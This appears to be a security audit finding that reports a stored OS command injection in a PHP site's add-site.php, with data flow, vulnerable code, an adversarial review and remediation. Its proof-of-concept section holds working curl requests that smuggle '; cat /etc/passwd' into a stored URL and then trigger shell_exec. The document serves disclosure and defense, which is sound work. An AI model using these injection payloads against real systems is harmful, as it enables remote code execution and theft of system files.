# Vulnerability: OS Command Injection — Stored via Add Site URL and Ping

## Summary
The `user/add-site.php` endpoint allows authenticated users to store URLs in the database (line 21) and later execute them via `shell_exec("time curl -I " . $site)` at line 16. An attacker can store a malicious URL containing shell metacharacters, then trigger the `ping` action to execute arbitrary OS commands. The `id` parameter for the ping action is protected by `intval()`, but the URL stored in the database is not sanitized before being passed to `shell_exec()`.

## Confidence
High

## Authentication Requirement
Authenticated (Low Privilege)

## Attack Surface Location
- **Endpoint:** `GET/POST /user/add-site.php`
- **Handler:** `user/add-site.php:1-42`
- **Middleware / Guards:** AumWAF, `isAuth()` check

## Attack Chain
1. **Initial access:** Attacker authenticates as any registered user.
2. **Endpoint interaction:** The attacker first stores a malicious URL via POST to add-site.php (line 21). Then triggers the `ping` action via GET with the stored site's ID.
3. **Malicious input:** `url` POST param = `; cat /etc/passwd` — stores a URL containing shell command separator. Then `ping=1&id=<site_id>` triggers execution.
4. **Sink execution:** `$site` is read from DB at line 14, then `shell_exec("time curl -I " . $site)` at line 16 executes the command.
5. **Post-exploitation:** Attacker achieves full Remote Code Execution as the web server user.
6. **Final impact:** Remote Code Execution — arbitrary OS command execution.

## Data Flow
- **Source (user input):** `$_POST['url']` (stored), `$_GET['id']` (lookup trigger)
- **Sink:** `shell_exec()` at `user/add-site.php:16`

```
$_POST['url'] → post('url') [common.php:32-33] → $mysqli->query("INSERT INTO tbl_sites ... url = '" . post('url') . "'") [add-site.php:21] → stored in DB

$_GET['id'] → intval(get('id')) [add-site.php:14] → DB lookup → $site = ...->fetch_object()->url [add-site.php:14] → "time curl -I " . $site [add-site.php:15] → shell_exec($cmd) [add-site.php:16]
```

## Proof of Concept

### Prerequisites
- Valid session cookie from any registered user account.

### Exploit Request — Step 1: Store Malicious URL
```bash
curl -X POST "http://{{TARGET_HOST}}/user/add-site.php" \
  -b "PHPSESSID={{SESSION_ID}}" \
  -d "url=; cat /etc/passwd"
```

### Exploit Request — Step 2: Trigger Command Execution
```bash
curl "http://{{TARGET_HOST}}/user/add-site.php?ping=1&id={{STORED_SITE_ID}}" \
  -b "PHPSESSID={{SESSION_ID}}"
```

### Expected Vulnerable Response
The `cmdout` variable in the template displays the output of the shell command, which includes the contents of `/etc/passwd`.

### Expected Patched Response
After escaping the URL before passing to `shell_exec()` (or using `escapeshellarg()`), the command injection is neutralized.

### Impact Demonstration
Attacker achieves full Remote Code Execution as the web server user. Can read/write files, install backdoors, pivot to other systems.

## Affected Code
```php
// user/add-site.php:13-17
if( get('ping') ) {
    $site = $mysqli->query("SELECT * FROM tbl_sites WHERE id = " . intval(get('id')))->fetch_object()->url;
    $cmd = "time curl -I " . $site;
    $out = shell_exec($cmd);
    $smarty->assign('cmdout', nl2br($out));
}

// user/add-site.php:20-22
if(isPost()) {
    $mysqli->query("INSERT INTO tbl_sites (user_id, url) VALUES ('" . cookie('user_id') . "', '" . post('url') . "')");
}
```

## Adversarial Review
Independent reviewer: `security_reviewer_adversary` (did not author this finding).

- **Reachability attack — FAILED to kill.** `GET/POST /user/add-site.php` requires only `isAuth()`. The URL is stored via POST at line 21 (no sanitization). The `ping` action at line 13 reads the URL from DB and passes it to `shell_exec()`.
- **Impact attack — FAILED to kill.** `shell_exec()` with attacker-controlled input achieves full RCE.
- **Validity attack — FAILED to kill.** No escaping on `$site` before shell_exec. Neither `escapeshellarg()` nor `escapeshellcmd()` is used anywhere in the codebase. The `intval()` at line 14 only protects the `id` lookup parameter, not the retrieved URL value.

**Verdict: SURVIVED** (all three attacks failed).

## Remediation
Remove `shell_exec` entirely. Use PHP's native curl extension with URL validation:
```php
if( get('ping') ) {
    $site = $mysqli->query("SELECT * FROM tbl_sites WHERE id = " . intval(get('id')))->fetch_object()->url;
    $site = filter_var($site, FILTER_VALIDATE_URL);
    if ($site === false) {
        $smarty->assign('cmdout', 'Invalid URL');
    } else {
        $ch = curl_init($site);
        curl_setopt($ch, CURLOPT_NOBODY, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        curl_exec($ch);
        $out = curl_getinfo($ch);
        curl_close($ch);
        $smarty->assign('cmdout', nl2br(print_r($out, true)));
    }
}
```